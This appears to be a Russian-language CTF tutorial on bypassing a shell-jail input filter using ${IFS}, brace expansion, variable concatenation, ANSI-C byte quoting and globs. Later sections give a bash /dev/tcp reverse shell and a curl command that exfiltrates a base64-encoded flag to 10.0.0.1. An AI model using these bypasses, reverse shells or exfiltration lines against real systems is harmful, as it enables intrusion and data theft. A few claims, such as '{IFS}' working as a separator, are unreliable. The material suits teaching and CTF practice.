## Вопрос, с которого всё начинается

В CTF дают «shell-джейл»: ты можешь выполнять команды, но фильтр вырезает пробелы и слово `cat`. Флаг лежит в файле, и его надо прочитать. Кажется, что без `cat` и пробелов сделать нечего. Но shell — это не просто запускалка программ: он **разбирает строку** по сложным правилам до того, как что-то запустить. Понять эти правила — значит обойти почти любой фильтр.

Разберём обход на джейле.

## Наш пример: shell-джейл с фильтром

Фильтр такой: нельзя использовать пробел и слово `cat`. Цель — прочитать `/tmp/pentestcode/shjail/flag.txt`. Начнём с того, как shell вообще понимает строку.

**Quoting** — это правила, по которым shell решает, что в строке буквально, а что — подстановка:

- `'...'` — одинарные кавычки: всё внутри буквально, подстановок нет;
- `"..."` — двойные: работают `$VAR`, `$(...)` и обратные кавычки, но не glob;
- `\` — экранирует один следующий символ.

```bash
$ echo '$HOME'
$HOME
$ echo "$HOME"
/home/serebr1k
```

В одинарных `$HOME` остался текстом, в двойных — раскрылся в значение переменной. Уже отсюда видно: кавычки решают, увидит ли shell специальный символ.

## Шаг 1: заменяем пробел через ${IFS}

Фильтр запрещает пробел, но shell понимает и другие разделители. Переменная **`IFS`** (Internal Field Separator) — это список символов, по которым shell разбивает строку на слова; по умолчанию там пробел, таб и новая строка. Ссылаясь на неё, мы получаем пробел, не печатая его:

```bash
$ a=ca; b=t; $a$b${IFS}/tmp/pentestcode/shjail/flag.txt
FLAG{sh3ll_qu0t1ng}
```

Сработало: `${IFS}` подставился как пробел, и фильтр его не увидел. Альтернативы — таб, перенаправление (`cat</flag`) и фигурные скобки:

```bash
$ {cat,/tmp/pentestcode/shjail/flag.txt}
FLAG{sh3ll_qu0t1ng}
```

Конструкция `{cmd,arg}` передаёт команде список аргументов **без пробела** между ними.

## Шаг 2: собираем запрещённое слово из частей

Фильтр запрещает слово `cat` целиком — но не запрещает собрать его из кусочков. Переменные склеиваются подстановкой:

```bash
$ a=ca; b=t; $a$b${IFS}/tmp/pentestcode/shjail/flag.txt
```

`$a$b` разворачивается в `cat` уже **после** проверки фильтра. Это базовый приём: фильтр видит `a=ca;b=t;$a$b`, а не `cat`.

## Шаг 3: ANSI-C quoting — байты вместо букв

Если фильтр вырезает конкретные буквы, помогает **ANSI-C quoting** — запись символа по его коду. Bash собирает строку из байтов:

```bash
$ $'\x63\x61\x74' /tmp/pentestcode/shjail/flag.txt
FLAG{sh3ll_qu0t1ng}
```

`$'\x63\x61\x74'` — это `cat`, записанный кодами `0x63`, `0x61`, `0x74`. Фильтр, ищущий буквы, ничего не находит. (Важно: этот трюк работает в `bash`/`zsh`, но не в `dash`.)

## Шаг 4: glob — когда запрещены буквы пути

Если запрещены буквы в имени файла, путь собирают **glob**-масками. `?` — ровно один любой символ, `*` — любая последовательность:

```bash
$ cat /tmp/pentestcode/shjail/fla?.txt
FLAG{sh3ll_qu0t1ng}
```

Glob раскрывается **до** запуска команды, поэтому маска подходит на реальный файл, даже если мы не написали ни одной буквы из его имени. `cat /???/?????` — типичный приём для путей вроде `/flag`.

## Шаг 5: порядок подстановок

Чтобы уверенно обходить фильтры, надо знать, в каком порядке bash обрабатывает строку:

1. brace expansion `{a,b}`;
2. tilde `~`;
3. подстановка параметров `$VAR`;
4. command substitution `$(...)` и арифметика `$((...))`;
5. разбиение на слова по `$IFS`;
6. glob `*?[]`;
7. запуск команды.

Практический вывод: `echo {a,b}$(id)` сначала раскроет brace, потом выполнит `id`. А запрещённый символ можно «протащить» через переменную, потому что подстановка `$VAR` происходит **после** проверки фильтром, но **до** запуска команды. Понимание порядка — ключ ко всем shell-головоломкам.

## Шаг 6: ограниченный shell и обратный шелл

Часто джейл даёт только несколько команд (`ls`, `echo`). Расширить возможности помогает **command substitution** — `$(...)` подставляет вывод команды в аргументы:

```bash
$ echo $(cat /tmp/pentestcode/shjail/flag.txt)
FLAG{sh3ll_qu0t1ng}
```

Если разрешён `echo`, то `echo $(...)` исполняет вложенную команду. Другие пути: перенаправления (`cat<file`), `eval` для сборки команды из строк, встроенные команды (`read`, `printf`, `source`).

Когда из задачи удаётся получить исполнение команды и нужен интерактив, строят **обратный шелл** — соединение, где жертва сама подключается к нам:

```bash
$ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

Или через `mkfifo` и `nc`. «Тупой» шелл потом стабилизируют (python pty + `stty raw -echo`), чтобы работали `Tab` и `Ctrl-C`. Если TTY нет вообще, вывод перенаправляют в файл или эксфильтруют через `curl`.

## Шаг 7: работа без TTY и эксфильтрация

Иногда команду выполняют «вслепую»: TTY нет, вывода не видно. Тогда результат выносят наружу — перенаправлением в файл или через сеть:

```bash
$ cat /flag | base64 | curl -s "http://10.0.0.1:8000/?d=$(cat)"
```

Данные кодируют в base64 (бинарный вывод иначе ломает URL), а `curl` относит их на наш сервер. Если сети нет — пишут в файл и читают его через другой канал. Если нет `bash` — пробуют `sh`, `dash`, `zsh`, `busybox sh`: набор доступных трюков зависит от shell (ANSI-C `$'\x..'` есть в bash, но не в dash). И помни про стабилизацию: «тупой» шелл без pty плохо переносит `Ctrl-C` и `Tab`, поэтому после получения доступа его «поднимают» через python pty и `stty raw -echo`.

## Если не сработало

Джейлы любят фильтровать именно те символы, на которые ты рассчитываешь. Разберём обходы.

**`${IFS}` заблокирован.** Есть другие разделители: `$IFS$9`, `{IFS}`, табуляция (`$'\t'`), перенос строки. В bash разделителем может служить любой символ из `$IFS` — попробуй `<`, `>`, `$'\n'`. Иногда работает подстановка команды как разделитель: `cat${IFS}/flag`.

**Слово собирается, но не исполняется.** Значит, фильтр ловит не текст, а результат подстановки — например, проверяет `argv` после раскрытия. Тогда меняем порядок: используем переменные (`a=fl;b=ag;cat /$a$b`), `printf` с шестнадцатеричными кодами, или читаем через glob (`cat /fl*`).

**ANSI-C quoting запрещён.** Запись вида `$'\x63\x61\x74'` даёт «cat» из байтовых кодов. Если она вырезана — используем `printf` в конвейере: `$(printf '\x63\x61\x74') /flag`, либо `echo -e`, либо собираем строку через `tr`: `echo 'png' | tr 'p' 'c'`.

**Glob не раскрывается.** Проверь, есть ли подходящие файлы в каталоге. `cat /fl*` сработает, только если файл начинается с `fl`. Если нет — используй `?`: `cat /?????`. Смотри `ls` (если разрешён) или `/proc/self/cwd`.

**Обратный шелл не приходит.** Причин много: нет `nc`/`bash`, запрещены сокеты, закрыт исходящий трафик. Тогда эксфильтруй данные по одному из каналов: DNS (поддомен с флагом в запросе), ICMP, или просто выведи флаг в ответ, если видишь stdout.

**Нет TTY.** `python3 -c 'import pty;pty.spawn("/bin/bash")'`, затем `Ctrl-Z`, `stty raw -echo`, `fg`. Для чистого вывода используй `script -qc /bin/bash /dev/null`.

## Частые вопросы

**Почему вообще возможен shell-джейл?** Приложение запускает команду через shell, но фильтрует строку *до* подстановок. Shell раскрывает переменные, glob и подстановки уже после фильтра — в этом разрыв.

**Что такое `$IFS`?** Internal Field Separator — символы, которыми shell делит строку на слова (по умолчанию пробел, табуляция, перенос). Если пробел запрещён, `$IFS` даёт его эквивалент.

**ANSI-C quoting — это что?** Запись `$'\x63'` заставляет bash интерпретировать escape-последовательности. Позволяет писать запрещённые буквы их байтовыми кодами.

**Порядок подстановок важен?** Да. Bash делает brace expansion, затем parameter expansion, command substitution, arithmetic, и только потом word splitting и glob. Понимание порядка подсказывает, что и когда подставляется.

## Порядок обхода фильтра

Действуй по шагам: сначала пойми, *что* фильтруется (пробел, буквы, кавычки, слова из чёрного списка), затем подбери эквивалент для запрещённого элемента. Пробел → `${IFS}`; буква → байтовый код (`printf`, `$'\x..'`); кавычки → glob или подстановка; имя команды → переменная или сборка из частей.

Всегда проверяй, где именно стоит фильтр: на входе (до подстановок) или на результате. Если до — работают подстановки; если на результате — фильтр видит уже раскрытую команду, и тогда собирай её динамически. И не забывай про эксфильтрацию: если вывод не виден, используй DNS, файл или тайминг. Держи в голове, что bash раскрывает `$IFS`, glob и command substitution уже *после* проверки ввода.

## Что мы теперь знаем

- Shell **разбирает строку** по правилам до запуска команды — в этом и живёт обход.
- **Quoting**: `'...'` отключает подстановки, `"..."` — нет.
- **`${IFS}`** даёт пробел, не печатая его; `{cmd,arg}` передаёт аргументы без пробела.
- Запрещённое слово **собирают из переменных** (`$a$b`); буквы заменяют **ANSI-C** `$'\x..'`.
- **Glob** (`?`, `*`) подбирает путь, когда буквы запрещены.
- Порядок: brace → tilde → `$VAR` → `$(...)` → разбиение по `IFS` → glob → запуск.

## На что смотреть дальше

Сначала определи, **что именно** фильтруется: пробелы, буквы, слова, кавычки, слэши. Затем собери запрещённое из частей или байтов, замени пробел на `${IFS}`/таб/`<`, а путь — на glob. Все приёмы проверяй в изолированном контейнере, а не на рабочей машине. Держи под рукой `bash -x` для трассировки и explainshell.com для разбора.
